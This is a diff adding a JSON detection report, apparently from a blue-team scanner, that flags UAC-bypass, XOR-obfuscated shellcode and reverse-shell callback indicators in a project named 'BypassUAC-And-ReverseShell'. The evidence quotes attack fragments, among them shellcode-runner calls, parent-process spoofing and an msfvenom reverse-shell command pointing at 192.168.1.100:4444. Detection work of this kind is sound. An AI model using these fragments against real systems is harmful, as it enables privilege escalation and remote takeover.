@@ -1,0 +1,271 @@
+[
+  {
+    "RuleId": "EVT-UAC-003",
+    "Severity": 4,
+    "Title": "Correlated UAC bypass and callback chain",
+    "Technique": "T1548.002 \u002B in-memory execution",
+    "Description": "Telemetry forms a high-confidence chain: auto-elevated system binary, elevated payload from a suspicious path, then outbound connectivity from that payload.",
+    "Recommendation": "Escalate immediately, isolate the endpoint, and collect process tree plus memory telemetry for the elevated payload.",
+    "Score": 95,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\BlueTeamDetector\\samples\\sample-sysmon-events.json",
+        "LineNumber": null,
+        "Snippet": "EventId=1; TimestampUtc=2026-04-07T05:10:16.0000000Z; C:\\Windows\\System32\\ComputerDefaults.exe | C:\\update\\ConsoleApp1.exe | C:\\Windows\\System32\\ComputerDefaults.exe"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\BlueTeamDetector\\samples\\sample-sysmon-events.json",
+        "LineNumber": null,
+        "Snippet": "EventId=1; TimestampUtc=2026-04-07T05:10:22.0000000Z; C:\\update\\ConsoleApp1.exe | High"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\BlueTeamDetector\\samples\\sample-sysmon-events.json",
+        "LineNumber": null,
+        "Snippet": "EventId=3; TimestampUtc=2026-04-07T05:10:30.0000000Z; 10.10.14.8 | 4444"
+      }
+    ],
+    "Metadata": {}
+  },
+  {
+    "RuleId": "SRC-MEM-001",
+    "Severity": 4,
+    "Title": "In-memory payload execution pattern",
+    "Technique": "In-memory execution",
+    "Description": "Source contains a classic shellcode runner sequence: executable allocation, memory copy, and thread creation.",
+    "Recommendation": "Hunt for memory allocations with execute permissions combined with thread creation and immediate network activity.",
+    "Score": 90,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\ConsoleApp1\\Program.cs",
+        "LineNumber": 46,
+        "Snippet": "static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\ConsoleApp1\\Program.cs",
+        "LineNumber": 49,
+        "Snippet": "static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\ConsoleApp1\\Program.cs",
+        "LineNumber": 74,
+        "Snippet": "Marshal.Copy(shellcode, 0, allocMem, shellcode.Length);"
+      }
+    ],
+    "Metadata": {}
+  },
+  {
+    "RuleId": "EVT-C2-001",
+    "Severity": 3,
+    "Title": "Suspicious outbound connection from staged payload",
+    "Technique": "Command and control",
+    "Description": "A payload from a suspicious path initiated a network connection, consistent with reverse-shell or callback behavior.",
+    "Recommendation": "Correlate with elevation events and block outbound traffic from unexpected administrative payloads.",
+    "Score": 55,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\BlueTeamDetector\\samples\\sample-sysmon-events.json",
+        "LineNumber": null,
+        "Snippet": "EventId=3; TimestampUtc=2026-04-07T05:10:30.0000000Z; C:\\update\\ConsoleApp1.exe | 10.10.14.8 | 4444"
+      }
+    ],
+    "Metadata": {}
+  },
+  {
+    "RuleId": "EVT-UAC-002",
+    "Severity": 3,
+    "Title": "Elevated payload launched from non-standard path",
+    "Technique": "T1548.002",
+    "Description": "A high-integrity process was launched from a path that is unusual for trusted administrative software.",
+    "Recommendation": "Alert on high-integrity child processes that execute from temp, user-writable, or hardcoded staging directories.",
+    "Score": 65,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\BlueTeamDetector\\samples\\sample-sysmon-events.json",
+        "LineNumber": null,
+        "Snippet": "EventId=1; TimestampUtc=2026-04-07T05:10:22.0000000Z; C:\\update\\ConsoleApp1.exe | C:\\Windows\\System32\\ComputerDefaults.exe | High"
+      }
+    ],
+    "Metadata": {}
+  },
+  {
+    "RuleId": "SRC-MEM-002",
+    "Severity": 3,
+    "Title": "Executable RWX memory allocation indicators",
+    "Technique": "In-memory execution",
+    "Description": "Source references executable writable memory, which is a strong indicator for shellcode runners and packers.",
+    "Recommendation": "Use EDR or ETW telemetry to flag RWX allocations made by unsigned or newly launched processes.",
+    "Score": 60,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\ConsoleApp1\\Program.cs",
+        "LineNumber": 46,
+        "Snippet": "static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\ConsoleApp1\\Program.cs",
+        "LineNumber": 63,
+        "Snippet": "// Allocate memory v\u1EDBi quy\u1EC1n RWX"
+      }
+    ],
+    "Metadata": {}
+  },
+  {
+    "RuleId": "SRC-UAC-001",
+    "Severity": 3,
+    "Title": "AppInfo-style UAC bypass indicators in source",
+    "Technique": "T1548.002",
+    "Description": "Source contains a suspicious combination of AppInfo RPC abuse markers and auto-elevated Windows binaries.",
+    "Recommendation": "Monitor process creation chains that involve auto-elevated Windows binaries and validate parent-child ancestry for unexpected payload launches.",
+    "Score": 70,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\test.c",
+        "LineNumber": 11,
+        "Snippet": "#define APPINFO_RPC L\u0022201ef99a-7fa0-444c-9399-19ba84f12a1a\u0022"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\test.c",
+        "LineNumber": 55,
+        "Snippet": "void RAiLaunchAdminProcess(PRPC_ASYNC_STATE AsyncHandle, handle_t hBinding, wchar_t *Path, wchar_t *Cmd, long SFlags, long CFlags, wchar_t *Dir, wchar_t *WSta, struct _APP_STARTUP_INFO *SInfo, unsigned __int3264 hWnd, long Tout, struct _APP_PROCESS_INFORMATION *PInfo, long *Elev) {"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\test.c",
+        "LineNumber": 14,
+        "Snippet": "#define COMPUTERDEFAULTS_EXE L\u0022\\\\ComputerDefaults.exe\u0022"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\test.c",
+        "LineNumber": 13,
+        "Snippet": "#define WINVER_EXE L\u0022\\\\winver.exe\u0022"
+      }
+    ],
+    "Metadata": {}
+  },
+  {
+    "RuleId": "SRC-UAC-002",
+    "Severity": 3,
+    "Title": "Elevated payload spawn from unusual path",
+    "Technique": "T1548.002",
+    "Description": "Source suggests parent-process spoofing or inherited elevated context used to start a payload from a non-standard path.",
+    "Recommendation": "Alert when high-integrity child processes launch from user-writable or uncommon directories outside Windows and Program Files.",
+    "Score": 65,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\test.c",
+        "LineNumber": 93,
+        "Snippet": "UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, \u0026ParentProcess, sizeof(HANDLE), NULL, NULL);"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\test.c",
+        "LineNumber": 100,
+        "Snippet": "if (CreateProcessW(NULL, Payload, NULL, NULL, FALSE,"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\test.c",
+        "LineNumber": 122,
+        "Snippet": "WCHAR lpszPayload[] = L\u0022C:\\\\update\\\\ConsoleApp1.exe\u0022;   // \u2190 \u0110\u01B0\u1EDDng d\u1EABn b\u1EA1n v\u1EEBa cung c\u1EA5p"
+      }
+    ],
+    "Metadata": {}
+  },
+  {
+    "RuleId": "EVT-UAC-001",
+    "Severity": 2,
+    "Title": "Auto-elevated Windows binary appeared in process chain",
+    "Technique": "T1548.002",
+    "Description": "Event telemetry shows an auto-elevated Windows binary that is frequently abused for UAC bypass or privilege manipulation.",
+    "Recommendation": "Review parent image, integrity level, and subsequent child processes to determine whether the launch was expected.",
+    "Score": 35,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\BlueTeamDetector\\samples\\sample-sysmon-events.json",
+        "LineNumber": null,
+        "Snippet": "EventId=1; TimestampUtc=2026-04-07T05:10:08.0000000Z; C:\\Windows\\System32\\winver.exe"
+      }
+    ],
+    "Metadata": {}
+  },
+  {
+    "RuleId": "EVT-UAC-001",
+    "Severity": 2,
+    "Title": "Auto-elevated Windows binary appeared in process chain",
+    "Technique": "T1548.002",
+    "Description": "Event telemetry shows an auto-elevated Windows binary that is frequently abused for UAC bypass or privilege manipulation.",
+    "Recommendation": "Review parent image, integrity level, and subsequent child processes to determine whether the launch was expected.",
+    "Score": 35,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\BlueTeamDetector\\samples\\sample-sysmon-events.json",
+        "LineNumber": null,
+        "Snippet": "EventId=1; TimestampUtc=2026-04-07T05:10:16.0000000Z; C:\\Windows\\System32\\ComputerDefaults.exe"
+      }
+    ],
+    "Metadata": {}
+  },
+  {
+    "RuleId": "SRC-C2-001",
+    "Severity": 2,
+    "Title": "Reverse-shell operator IOC in project artifacts",
+    "Technique": "Command and control",
+    "Description": "Source or documentation references reverse-shell tooling and listener setup consistent with callback payloads.",
+    "Recommendation": "Correlate network events with elevated process launches to reduce false positives from lab notes or training material.",
+    "Score": 40,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\xor_encrypt.py",
+        "LineNumber": 7,
+        "Snippet": "# V\u00ED d\u1EE5: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\xor_encrypt.py",
+        "LineNumber": 7,
+        "Snippet": "# V\u00ED d\u1EE5: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin"
+      }
+    ],
+    "Metadata": {}
+  },
+  {
+    "RuleId": "SRC-OBF-001",
+    "Severity": 2,
+    "Title": "XOR-obfuscated shellcode markers",
+    "Technique": "T1027",
+    "Description": "Source includes XOR key material and an encrypted shellcode blob, indicating payload obfuscation before in-memory execution.",
+    "Recommendation": "Triangulate with runtime telemetry before escalating to high-confidence malware classification.",
+    "Score": 45,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\xor_encrypt.py",
+        "LineNumber": 26,
+        "Snippet": "print(\u0022unsigned char XorKey[] = {\u0022, end=\u0022\u0022)"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\xor_encrypt.py",
+        "LineNumber": 29,
+        "Snippet": "print(\u0022unsigned char EncryptedShellcode[] = {\u0022)"
+      }
+    ],
+    "Metadata": {}
+  },
+  {
+    "RuleId": "SRC-OBF-001",
+    "Severity": 2,
+    "Title": "XOR-obfuscated shellcode markers",
+    "Technique": "T1027",
+    "Description": "Source includes XOR key material and an encrypted shellcode blob, indicating payload obfuscation before in-memory execution.",
+    "Recommendation": "Triangulate with runtime telemetry before escalating to high-confidence malware classification.",
+    "Score": 45,
+    "Evidence": [
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\ConsoleApp1\\Program.cs",
+        "LineNumber": 10,
+        "Snippet": "private static readonly byte[] XorKey = { 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22 };"
+      },
+      {
+        "Source": "d:\\1\\BypassUAC-And-ReverseShell\\ConsoleApp1\\Program.cs",
+        "LineNumber": 13,
+        "Snippet": "private static readonly byte[] EncryptedShellcode = new byte[] {"
+      }
+    ],
+    "Metadata": {}
+  }
+]
